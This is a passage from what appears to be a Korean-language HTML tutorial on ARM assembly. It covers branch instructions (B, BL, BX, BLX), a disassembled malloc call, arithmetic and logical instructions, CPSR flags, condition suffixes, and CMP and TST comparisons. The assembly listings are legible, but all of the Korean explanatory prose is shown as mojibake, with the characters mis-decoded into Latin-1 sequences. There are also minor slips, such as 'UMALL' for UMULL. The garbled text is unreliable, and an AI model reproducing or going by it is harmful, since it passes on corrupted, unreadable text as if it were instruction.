ê°™ì´ ìŠ¤ë™ì—ì„œ ë¦¬í„´ ì£¼ì†Œë¥¼ ì§ì ‘ êº¼ë‚´ <code>PC</code> ì— ëŒ€ì…í•˜ê±°ë‚˜, <code>BX LR</code> ê³¼ ê°™ì´ ë§í¬ ë ˆì§€ìŠ¤í„°ë¡œ ë¶„ê¸°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</li></ul></li><li>ë¶„ê¸°í•  ë•Œ ëª©ì ì§€ ì£¼ì†Œì˜ ìµœí•˜ìœ„ ë¹„íŠ¸(LSB)ì— ë”°ë¼ ARM ìƒíƒœì™€ Thumb ìƒíƒœë¥¼ ì˜¤ê°ˆ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</li><li>í•¨ìˆ˜ í˜¸ì¶œ ê·œì•½ì˜ ì°¨ì´ê°€ ìˆìŠµë‹ˆë‹¤.<ul><li>4ê°œ ë§¤ê°œë³€ìˆ˜ê¹Œì§€ ë ˆì§€ìŠ¤í„° <code>R0</code> , <code>R1</code> , <code>R2</code> , <code>R3</code> ì„ í†µí•´ ì „ë‹¬í•˜ë©°, ë‚˜ë¨¸ì§€ëŠ” ìŠ¤íƒì„ í†µí•´ ì „ë‹¬í•©ë‹ˆë‹¤.</li><li>ë¦¬í„´ ê°’ì€ <code>R0</code> ì— ë³´ê´€í•©ë‹ˆë‹¤.</li></ul></li></ol><p>í•¨ìˆ˜ í˜¸ì¶œê³¼ ë¶„ê¸°ì— ì‚¬ìš©ë˜ëŠ” ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì€ <code>B</code> , <code>BX</code> , <code>BL</code> ê³¼ <code>BLX</code> ê°€ ìˆìŠµë‹ˆë‹¤.</p><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">B</span> label</span><br><span class="line"><span class="keyword">BL</span> label</span><br></pre></td></tr></table></figure><p><code>B</code> ëŠ” ë‹¨ìˆœí•œ ë¶„ê¸°ë¡œ, x86/64ì—ì„œì˜ <code>JMP</code> ì™€ ë™ì¼í•©ë‹ˆë‹¤. í•¨ìˆ˜ í˜¸ì¶œì—ëŠ” ê±°ì˜ ì‚¬ìš©ë˜ì§€ ì•Šì§€ë§Œ, ë¦¬í„´í•˜ì§€ ì•ŠëŠ” í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ê¸° ìœ„í•´ ì‚¬ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì£¼ë¡œ ë°˜ë³µë¬¸ì´ë‚˜ ì¡°ê±´ë¬¸ì—ì„œ ì½”ë“œ ë¸”ë¡ì˜ ì‹œì‘ìœ¼ë¡œ ëŒì•„ê°€ê±°ë‚˜ íƒˆì¶œí•˜ê¸° ìœ„í•´ ì‚¬ìš©ë©ë‹ˆë‹¤. <code>BL</code> ì€ branch with linkë¡œ, ë¶„ê¸° ì „ <code>LR</code> ì— ë‹¤ìŒ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì˜ ì£¼ì†Œë¥¼ ì €ì¥í•©ë‹ˆë‹¤. x86/64ì—ì„œì˜ <code>CALL</code> ê³¼ ë¹„ìŠ·í•œ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì…ë‹ˆë‹¤. <code>B</code> ì™€ <code>BL</code> ì€ ëª¨ë‘ ë ˆì´ë¸”ì˜ ì˜¤í”„ì…‹ë§Œ ì¸ìë¡œ ë°›ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">BX</span> Rm</span><br></pre></td></tr></table></figure><p><code>BX</code> ëŠ” branch and exchangeë¡œ, <code>B</code> ì™€ ë¹„ìŠ·í•˜ì§€ë§Œ ëª©ì ì§€ ì£¼ì†Œê°€ ë ˆì§€ìŠ¤í„°ë¡œ ì „ë‹¬ë˜ê³  ARMê³¼ Thumb ìƒíƒœë¥¼ ì˜¤ê°ˆ ìˆ˜ ìˆìŠµë‹ˆë‹¤. (ëª©ì ì§€ ì£¼ì†Œì˜ ìµœí•˜ìœ„ ë¹„íŠ¸ê°€ 1ì´ë©´ Thumb ìƒíƒœê°€ ë©ë‹ˆë‹¤) í”íˆ í•¨ìˆ˜ ì—í•„ë¡œê·¸ì—ì„œ ë¦¬í„´ì„ ìœ„í•´ ì‚¬ìš©ë˜ê±°ë‚˜, (i.e. <code>BX LR</code>) ë‹¤ë¥¸ ìƒíƒœì˜ ì½”ë“œë¡œ ë¶„ê¸°í•  ë•Œ ì‚¬ìš©ë©ë‹ˆë‹¤.</p><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">BLX</span> label</span><br><span class="line"><span class="keyword">BLX</span> Rm</span><br></pre></td></tr></table></figure><p><code>BLX</code> ëŠ” branch with link and exchangeë¡œ, <code>BL</code> ê³¼ ë¹„ìŠ·í•˜ì§€ë§Œ ARMê³¼ Thumb ìƒíƒœë¥¼ ì „í™˜í•  ìˆ˜ ìˆìœ¼ë©° ì¸ìë¡œ ë ˆì§€ìŠ¤í„°ì— ë³´ê´€ëœ ëª©ì ì§€ ì£¼ì†Œë‚˜ ë ˆì´ë¸”ì˜ ì˜¤í”„ì…‹ ëª¨ë‘ë¥¼ ì „ë‹¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. (<code>BLX</code> ê°€ ë ˆì´ë¸”ì˜ ì˜¤í”„ì…‹ì„ ì¸ìë¡œ ë°›ëŠ” ê²½ìš°ëŠ” ë°˜ë“œì‹œ ìƒíƒœë¥¼ ì „í™˜í•˜ê¸° ìœ„í•¨ì…ë‹ˆë‹¤) <code>BL</code>ê³¼ <code>BLX</code> ëŠ” ëª¨ë‘ í•¨ìˆ˜ í˜¸ì¶œì— ì‚¬ìš©ë˜ëŠ”ë°, <code>BL</code> ëŠ” í˜„ì¬ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ìœ¼ë¡œë¶€í„° 32MB ë²”ìœ„ ì•ˆì— ìˆëŠ” í•¨ìˆ˜ í˜¸ì¶œì— ì‚¬ìš©í•˜ë©° <code>BLX</code> ëŠ” í•¨ìˆ˜ì˜ ì£¼ì†Œê°€ ì •í•´ì§€ì§€ ì•Šì€ (e.g. í•¨ìˆ˜ í¬ì¸í„°) ê²½ìš° ì‚¬ìš©í•©ë‹ˆë‹¤. Thumb ìƒíƒœì—ì„œ <code>BLX</code> ëŠ” ì£¼ë¡œ ë¼ì´ë¸ŒëŸ¬ë¦¬ í•¨ìˆ˜ í˜¸ì¶œì— ì‚¬ìš©ë˜ë©°, ARM ìƒíƒœì—ì„œëŠ” <code>BL</code> ì„ ëŒ€ì‹  ì‚¬ìš©í•©ë‹ˆë‹¤.</p><p>ë‹¤ìŒ ì˜ˆì œëŠ” ì–´ë–¤ í•¨ìˆ˜ë¥¼ ë””ìŠ¤ì–´ì…ˆë¸”í•œ ê²°ê³¼ì¸ë°, í•¨ìˆ˜ í˜¸ì¶œê³¼ ë¶„ê¸°ë¥¼ ìœ„í•œ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì´ ì–´ë–»ê²Œ ì‚¬ìš©ë˜ê³  ìˆëŠ”ì§€ ì‚´í´ë³´ê² ìŠµë‹ˆë‹¤.</p><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">PUSH.W</span> &#123;<span class="built_in">R4</span>,<span class="built_in">R5</span>,<span class="built_in">R11</span>,<span class="built_in">LR</span>&#125;</span><br><span class="line"><span class="symbol">ADDW</span> <span class="built_in">R11</span>, <span class="built_in">SP</span>, <span class="number">#8</span></span><br><span class="line"><span class="keyword">LDR</span> <span class="built_in">R3</span>, <span class="symbol">=__imp_malloc</span></span><br><span class="line"><span class="keyword">ADDS</span> <span class="built_in">R5</span>, <span class="built_in">R0</span>, <span class="number">#7</span></span><br><span class="line"><span class="symbol">BFC.W</span> <span class="built_in">R5</span>, <span class="number">#0</span>, <span class="number">#3</span></span><br><span class="line"><span class="keyword">LDR</span> <span class="built_in">R3</span>, [<span class="built_in">R3</span>]</span><br><span class="line"><span class="symbol">ADDS.W</span> <span class="built_in">R0</span>, <span class="built_in">R5</span>, <span class="number">#8</span></span><br><span class="line"><span class="keyword">BLX</span> <span class="built_in">R3</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">R4</span>, <span class="built_in">R0</span></span><br><span class="line"><span class="keyword">CBZ</span> <span class="built_in">R4</span>, loc_100C3AE</span><br><span class="line"><span class="keyword">ASRS</span> <span class="built_in">R3</span>, <span class="built_in">R5</span>, <span class="number">#0x1F</span></span><br><span class="line"><span class="keyword">STR</span> <span class="built_in">R3</span>, [<span class="built_in">R4</span>,<span class="number">#4</span>]</span><br><span class="line"><span class="keyword">STR</span> <span class="built_in">R5</span>, [<span class="built_in">R4</span>]</span><br><span class="line"><span class="keyword">B</span> loc_100C3B8</span><br><span class="line"></span><br><span class="line"><span class="symbol">loc_100C3AE:</span></span><br><span class="line"><span class="keyword">LDR</span> <span class="built_in">R1</span>, <span class="symbol">=aFailed</span> <span class="comment">; &quot;failed...&quot;</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">R2</span>, <span class="built_in">R5</span></span><br><span class="line"><span class="keyword">MOVS</span> <span class="built_in">R0</span>, <span class="number">#7</span></span><br><span class="line"><span class="keyword">BL</span> foo</span><br><span class="line"></span><br><span class="line"><span class="symbol">loc_100C3B8:</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">R0</span>, <span class="built_in">R4</span></span><br><span class="line"><span class="symbol">POP.W</span> &#123;<span class="built_in">R4</span>,<span class="built_in">R5</span>,<span class="built_in">R11</span>,<span class="built_in">PC</span>&#125;</span><br></pre></td></tr></table></figure><ul><li>1í–‰ì˜ <code>PUSH.W &#123;R4,R5,R11,LR&#125;</code> ì€ í•¨ìˆ˜ í”„ë¡¤ë¡œê·¸, 24í–‰ì˜ <code>POP.W &#123;R4,R5,R11,PC&#125;</code> ëŠ” í•¨ìˆ˜ ì—í•„ë¡œê·¸ì— í•´ë‹¹í•©ë‹ˆë‹¤.</li><li>8í–‰ì—ì„œ <code>BLX</code> ë¥¼ ì´ìš©í•´ <code>malloc</code> ë¼ì´ë¸ŒëŸ¬ë¦¬ í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ê³  ìˆìŠµë‹ˆë‹¤.</li><li>20í–‰ì—ì„œ <code>BL</code> ì„ ì´ìš©í•´ <code>foo</code> í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ê³  ìˆìŠµë‹ˆë‹¤.</li></ul><h2 id="%EC%82%B0%EC%88%A0-%EC%97%B0%EC%82%B0" tabindex="-1">ì‚°ìˆ  ì—°ì‚°</h2><p><code>MOV</code> ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì€ ê°’ì„ ëŒ€ì…í•˜ëŠ” ê°€ì¥ ë‹¨ìˆœí•œ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì…ë‹ˆë‹¤. ëŒ€ì…í•˜ëŠ” ê°’ì€ ìƒìˆ˜ê±°ë‚˜ ë ˆì§€ìŠ¤í„°ì˜ ê°’, ë˜ëŠ” ë ˆì§€ìŠ¤í„°ì˜ ê°’ì— ë°°ëŸ´ ì‹œí”„í„°ë¥¼ ì‚¬ìš©í•œ ê°’ì…ë‹ˆë‹¤. ë°°ëŸ´ ì‹œí”„í„°ë¡œëŠ” ê°’ì— ëŒ€í•œ ì™¼ìª½ ì‹œí”„íŠ¸(<code>LSL</code>), ì˜¤ë¥¸ìª½ ì‹œí”„íŠ¸(<code>LSR</code>, <code>ASR</code>), íšŒì „(<code>ROR</code>, <code>RRX</code>)ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.</p><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">MOV</span> <span class="built_in">R0</span>, <span class="number">#0xa</span>            <span class="comment">; R0 = 0xa</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">R0</span>, <span class="built_in">R7</span>              <span class="comment">; R0 = R7</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">R4</span>, <span class="built_in">R4</span>, <span class="keyword">LSR</span> <span class="number">#21</span>     <span class="comment">; R4 = (R4 &gt;&gt; 21)</span></span><br></pre></td></tr></table></figure><p>ê¸°ì´ˆì ì¸ ì‚°ìˆ  ë° ë…¼ë¦¬ ì—°ì‚° ì¸ìŠ¤íŠ¸ëŸ­ì…˜ìœ¼ë¡œëŠ” <code>ADD</code> , <code>SUB</code> , <code>MUL</code> , <code>AND</code> , <code>ORR</code> , <code>EOR</code> ì´ ìˆìŠµë‹ˆë‹¤. ë‹¤ìŒ ì˜ˆì œì—ì„œ ì¼ë¶€ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì—ëŠ” <code>S</code> ì ‘ë¯¸ì‚¬ê°€ ë¶™ì–´ ìˆëŠ”ë°, ì‚°ìˆ  ì—°ì‚°ì˜ ê²°ê³¼ì— ë”°ë¼ <code>CPSR</code> ë ˆì§€ìŠ¤í„°ì˜ í”Œë˜ê·¸(e.g. zero ë¹„íŠ¸, negative ë¹„íŠ¸)ë¥¼ ê°±ì‹ í•´ì•¼ í•¨ì„ ì˜ë¯¸í•©ë‹ˆë‹¤.</p><ul><li>x86/64ì™€ëŠ” ë‹¬ë¦¬, ARM ì‚°ìˆ  ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì€ ê¸°ë³¸ì ìœ¼ë¡œ <code>CPSR</code> ì„ ê°±ì‹ í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤.</li></ul><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ADD</span> <span class="built_in">R3</span>, <span class="built_in">R9</span>              <span class="comment">; R3 = R3 + R9</span></span><br><span class="line"><span class="keyword">ADD</span> <span class="built_in">R11</span>, <span class="built_in">SP</span>, <span class="number">#8</span>         <span class="comment">; R11 = SP + 8</span></span><br><span class="line"><span class="keyword">ADD</span> <span class="built_in">R0</span>, <span class="built_in">R4</span>, <span class="keyword">LSL</span> <span class="number">#2</span>      <span class="comment">; R0 = (R4 &lt;&lt; 2)</span></span><br><span class="line"><span class="keyword">SUB</span> <span class="built_in">SP</span>, <span class="built_in">SP</span>, <span class="number">#0x1a8</span>      <span class="comment">; SP = SP - 0x1a8</span></span><br><span class="line"><span class="keyword">MUL</span> <span class="built_in">R2</span>, <span class="built_in">R3</span>, <span class="built_in">R5</span>          <span class="comment">; R2 = R3 * R5 (ê²°ê³¼ì˜ í•˜ìœ„ 32ë¹„íŠ¸ë§Œ ì €ì¥ë©ë‹ˆë‹¤)</span></span><br><span class="line"><span class="keyword">ANDS</span> <span class="built_in">R2</span>, <span class="built_in">R4</span>, <span class="number">#7</span>         <span class="comment">; R2 = R4 &amp; 7 (CPSRì„ ê°±ì‹ í•©ë‹ˆë‹¤)</span></span><br><span class="line"><span class="keyword">EOR</span> <span class="built_in">R3</span>, <span class="built_in">R3</span>, <span class="built_in">R1</span>, <span class="keyword">LSL</span> <span class="number">#3</span>  <span class="comment">; R3 = R3 ^ (R1 &lt;&lt; 3)</span></span><br><span class="line"><span class="keyword">EORS</span> <span class="built_in">R3</span>, <span class="built_in">R2</span>             <span class="comment">; R3 = R3 ^ R2 (CPSRì„ ê°±ì‹ í•©ë‹ˆë‹¤)</span></span><br><span class="line"><span class="keyword">ORR</span> <span class="built_in">R3</span>, <span class="built_in">R3</span>, <span class="built_in">R2</span>, <span class="keyword">LSL</span> <span class="number">#8</span>  <span class="comment">; R3 = R3 | (R2 &lt;&lt; 8)</span></span><br><span class="line"><span class="keyword">ORRS</span> <span class="built_in">R3</span>, <span class="built_in">R3</span>, <span class="number">#2</span>         <span class="comment">; R3 = R3 | 2 (CPSRì„ ê°±ì‹ í•©ë‹ˆë‹¤)</span></span><br><span class="line"><span class="keyword">ORRS</span> <span class="built_in">R3</span>, <span class="built_in">R2</span>             <span class="comment">; R3 = R3 | R2 (CPSRì„ ê°±ì‹ í•©ë‹ˆë‹¤)</span></span><br></pre></td></tr></table></figure><p><code>MUL</code> ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì€ ê²°ê³¼ì˜ í•˜ìœ„ 32ë¹„íŠ¸ë§Œì´ ëª©ì ì§€ ë ˆì§€ìŠ¤í„°ì— ì €ì¥ë˜ë©°, 64ë¹„íŠ¸ ê°’ ì „ì²´ê°€ í•„ìš”í•œ ê²½ìš° <code>SMULL</code> , <code>UMALL</code> ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì„ ì‚¬ìš©í•´ì•¼ í•©ë‹ˆë‹¤. ë˜í•œ ë‚˜ëˆ—ì…ˆ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì´ ì¡´ì¬í•˜ì§€ ì•ŠëŠ”ë°, (ARMv7-Rê³¼ ARMv7-Mì— <code>SDIV</code> , <code>UDIV</code> ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì´ ìˆê¸°ëŠ” í•©ë‹ˆë‹¤) ì‹¤ì œë¡œëŠ” ë‚˜ëˆ—ì…ˆì„ ì†Œí”„íŠ¸ì›¨ì–´ì ìœ¼ë¡œ êµ¬í˜„í•˜ì—¬ í•„ìš”í•œ ê²½ìš° í˜¸ì¶œí•˜ë„ë¡ í•©ë‹ˆë‹¤.</p><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">MOV</span> <span class="built_in">R1</span>, <span class="built_in">R8</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">R0</span>, <span class="built_in">R6</span></span><br><span class="line"><span class="keyword">BL</span> __rt_udiv            <span class="comment">; ì†Œí”„íŠ¸ì›¨ì–´ì ìœ¼ë¡œ êµ¬í˜„í•œ ë‚˜ëˆ—ì…ˆ í•¨ìˆ˜</span></span><br></pre></td></tr></table></figure><h2 id="%EC%A1%B0%EA%B1%B4%EB%B6%80-%EB%B6%84%EA%B8%B0%EC%99%80-%EC%8B%A4%ED%96%89" tabindex="-1">ì¡°ê±´ë¶€ ë¶„ê¸°ì™€ ì‹¤í–‰</h2><p>ë°˜ë³µë¬¸ê³¼ ì¡°ê±´ë¬¸ì• ì„œ ì‚¬ìš©ë˜ëŠ” ì¡°ê±´ë¶€ ë¶„ê¸°ëŠ” <code>CPSR</code> ë ˆì§€ìŠ¤í„°ì—ì„œ ë‹¤ìŒê³¼ ê°™ì€ í”Œë˜ê·¸ë“¤ì„ ì‚¬ìš©í•©ë‹ˆë‹¤.</p><ul><li><code>N</code> (negative flag) - ê²°ê³¼ê°€ ìŒìˆ˜ì¸ ê²½ìš° (ìµœìƒìœ„ ë¹„íŠ¸ê°€ 1ì¸ ê²½ìš°) 1ì…ë‹ˆë‹¤.</li><li><code>Z</code> (zero flag) - ê²°ê³¼ê°€ 0ì´ë©´ 1ì…ë‹ˆë‹¤.</li><li><code>C</code> (carry flag) - ë¶€í˜¸ê°€ ì—†ëŠ” ì—°ì‚°ì˜ ê²°ê³¼ ì˜¤ë²„í”Œë¡œìš°ê°€ ë°œìƒí•˜ë©´ 1ì…ë‹ˆë‹¤.</li><li><code>V</code> (overflow flag) - ë¶€í˜¸ê°€ ìˆëŠ” ì—°ì‚°ì˜ ê²°ê³¼ ì˜¤ë²„í”Œë¡œìš°ê°€ ë°œìƒí•˜ë©´ 1ì…ë‹ˆë‹¤.</li><li><code>IT</code> (if-then bits) - Thumb ìƒíƒœì˜ <code>IT</code> ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì—ì„œ ì¡°ê±´ë¶€ ë¶„ê¸°ì˜ ì¡°ê±´ë“¤ì— í•´ë‹¹í•˜ëŠ”ë°, ë’¤ì—ì„œ ìì„¸íˆ ì„¤ëª…í•©ë‹ˆë‹¤.</li></ul><p>ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì€ ë‹¤ìŒê³¼ ê°™ì´ ì¡°ê±´ì„ ë‚˜íƒ€ë‚´ëŠ” ì ‘ë¯¸ì‚¬ ì¤‘ í•˜ë‚˜ë¥¼ ë¶™ì—¬ ì¡°ê±´ë¶€ë¡œ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><ul><li>e.g. <code>BLT</code> ëŠ” ì•„ë˜ í‘œì—ì„œ <code>LT</code> ì¡°ê±´ì´ ì°¸ì¸ ê²½ìš°ì—ë§Œ ë¶„ê¸°í•˜ë¼ëŠ” ì˜ë¯¸ë¡œ, x86/64ì—ì„œì˜ <code>JL</code> ê³¼ ê°™ìŠµë‹ˆë‹¤.</li></ul><table><thead><tr><th>ì ‘ë¯¸ì‚¬</th><th>ì˜ë¯¸</th><th>í”Œë˜ê·¸</th></tr></thead><tbody><tr><td><code>EQ</code></td><td>Equal</td><td><code>Z == 1</code></td></tr><tr><td><code>NE</code></td><td>Not equal</td><td><code>Z == 0</code></td></tr><tr><td><code>MI</code></td><td>Minus, negative</td><td><code>N == 1</code></td></tr><tr><td><code>PL</code></td><td>Plus, positive or zero</td><td><code>N == 0</code></td></tr><tr><td><code>HI</code></td><td>Unsigned higher/above</td><td><code>C == 1</code> and <code>Z == 0</code></td></tr><tr><td><code>LS</code></td><td>Unsigned lower/below</td><td><code>C == 0</code> or <code>Z == 1</code></td></tr><tr><td><code>GE</code></td><td>Signed greater than or equal</td><td><code>N == V</code></td></tr><tr><td><code>LT</code></td><td>Signed less than</td><td><code>N != V</code></td></tr><tr><td><code>GT</code></td><td>Signed greater than</td><td><code>Z == 0</code> and <code>N == V</code></td></tr><tr><td><code>LE</code></td><td>Signed less than or equal</td><td><code>Z == 1</code> or <code>N != V</code></td></tr></tbody></table><p>ë¹„êµë¥¼ ìœ„í•œ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ìœ¼ë¡œ <code>CBZ</code> , <code>CMP</code> , <code>TST</code> , <code>CMN</code> , <code>TEQ</code> ê°€ ìˆìœ¼ë©°, ë¹„êµ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì€ ê¸°ë³¸ê°’ìœ¼ë¡œ <code>CPSR</code> ì„ ê°±ì‹ í•˜ì§€ ì•ŠëŠ” ë‹¤ë¥¸ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ê³¼ ë‹¬ë¦¬ <code>CPSR</code> ì˜ í”Œë˜ê·¸ë“¤ì„ ìë™ìœ¼ë¡œ ê°±ì‹ í•©ë‹ˆë‹¤.</p><p>ê°€ì¥ í”í•œ ë¹„êµ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì€ <code>CMP</code> ë¡œ, <code>Rn</code> ì€ ë ˆì§€ìŠ¤í„°ì´ê³  <code>Operand2</code> ëŠ” ìƒìˆ˜, ë ˆì§€ìŠ¤í„°ì˜ ê°’ ë˜ëŠ” ë ˆì§€ìŠ¤í„°ì˜ ê°’ì— ë°°ëŸ´ ì‹œí”„í„°ë¥¼ ì‚¬ìš©í•œ ê°’ì…ë‹ˆë‹¤. <code>CMP</code> ëŠ” x86/64ì—ì„œì™€ ê°™ì´ <code>Rn - Operand2</code> ë¥¼ ì—°ì‚°í•˜ê³ , <code>CPSR</code> ì„ ê°±ì‹ í•œ í›„ ê²°ê³¼ë¥¼ ë²„ë¦½ë‹ˆë‹¤.</p><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CMP</span> Rn, Operand2</span><br></pre></td></tr></table></figure><p>ë‹¤ìŒ ì—¬ëŸ¬ ë¸”ë¡ì´ ìˆëŠ” ì¡°ê±´ë¬¸ì—ì„œ ì¡°ê±´ ë¶„ê¸°ê°€ ì‚¬ìš©ë˜ëŠ” ì˜ˆì œì…ë‹ˆë‹¤.</p><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">CMP.W</span> <span class="built_in">R3</span>, <span class="built_in">R7</span>, <span class="keyword">ASR</span> <span class="number">#31</span></span><br><span class="line"><span class="keyword">BLT</span> loc_less</span><br><span class="line"><span class="keyword">BGT</span> loc_greater</span><br><span class="line"><span class="keyword">CMP</span> <span class="built_in">R5</span>, <span class="built_in">R7</span></span><br><span class="line"><span class="keyword">BLS</span> loc_less</span><br><span class="line"></span><br><span class="line"><span class="symbol">loc_greater:</span></span><br><span class="line"><span class="keyword">SUBS</span> <span class="built_in">R5</span>, <span class="number">#7</span></span><br><span class="line"><span class="symbol">SBC.W</span> <span class="built_in">LR</span>, <span class="built_in">LR</span>, <span class="number">#0</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">loc_less:</span></span><br><span class="line"><span class="symbol">UMULL.W</span> <span class="built_in">R1</span>, <span class="built_in">R2</span>, <span class="built_in">R5</span>, <span class="built_in">R8</span></span><br><span class="line"><span class="symbol">SMULL.W</span> <span class="built_in">R0</span>, <span class="built_in">R4</span>, <span class="built_in">R7</span>, <span class="built_in">R8</span></span><br><span class="line"><span class="symbol">MLA.W</span> <span class="built_in">R3</span>, <span class="built_in">LR</span>, <span class="built_in">R8</span>, <span class="built_in">R2</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (R3 &lt; R7) &#123; <span class="keyword">goto</span> loc_less; &#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (R3 &gt; R7) &#123; <span class="keyword">goto</span> loc_greater; &#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (R5 &lt; R7) &#123; <span class="keyword">goto</span> loc_less; &#125;</span><br></pre></td></tr></table></figure><p>ë‹¤ìŒìœ¼ë¡œ í”í•œ ë¹„êµ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì€ <code>TST</code> ë¡œ, <code>CMP</code> ì™€ ë¬¸ë²•ì´ ê°™ìŠµë‹ˆë‹¤. ë§ˆì°¬ê°€ì§€ë¡œ x86/64ì˜ <code>TEST</code> ì™€ ê°™ì´ <code>Rn &amp; Operand2</code> ë¥¼ ì—°ì‚°í•˜ê³ , <code>CPSR</code> ì„ ê°±ì‹ í•œ í›„ ê²°ê³¼ë¥¼ ë²„ë¦½ë‹ˆë‹¤. <code>TST</code> ëŠ” ì£¼ë¡œ ì–´ë–¤ ê°’ì´ ë‹¤ë¥¸ ê°’ê³¼ ë™ì¼í•œì§€, ë˜ëŠ” íŠ¹ì • í”Œë˜ê·¸ë¥¼ ê²€ì‚¬í•˜ê¸° ìœ„í•´ ì‚¬ìš©í•©ë‹ˆë‹¤.</p><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">TST</span> Rn, Operand2</span><br></pre></td></tr></table></figure><p>ë‹¤ìŒì€ íŠ¹ì • ë¹„íŠ¸ë¥¼ ê²€ì‚¬í•˜ì—¬ ì°¸ì¸ ê²½ìš° ë¶„ê¸°í•˜ëŠ” ì˜ˆì œì…ë‹ˆë‹¤.</p><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">LDRH</span> <span class="built_in">R3</span>, [<span class="built_in">R5</span>,<span class="number">#0x14</span>]</span><br><span class="line"><span class="symbol">TST.W</span> <span class="built_in">R3</span>, <span class="number">#2</span></span><br><span class="line"><span class="keyword">BEQ</span> loc_10179DA</span><br><span class="line"><span class="comment">; ...</span></span><br><span class="line"><span class="symbol">loc_10179BE:</span></span><br><span class="line"><span class="keyword">LDRH</span> <span class="built_in">R2</span>, [<span class="built_in">R5</span>,<span class="number">#0x14</span>]</span><br><span class="line"><span class="symbol">TST.W</span> <span class="built_in">R2</span>, <span class="number">#4</span></span><br><span class="line"><span class="keyword">BEQ</span> loc_10179E8</span><br></pre></td></tr></table></figure><p><code>CBZ</code> ì™€ <code>CBNZ</code> ëŠ” Thumb ìƒíƒœì—ì„œ ìì£¼ ì“°ì´ëŠ” ë¹„êµ 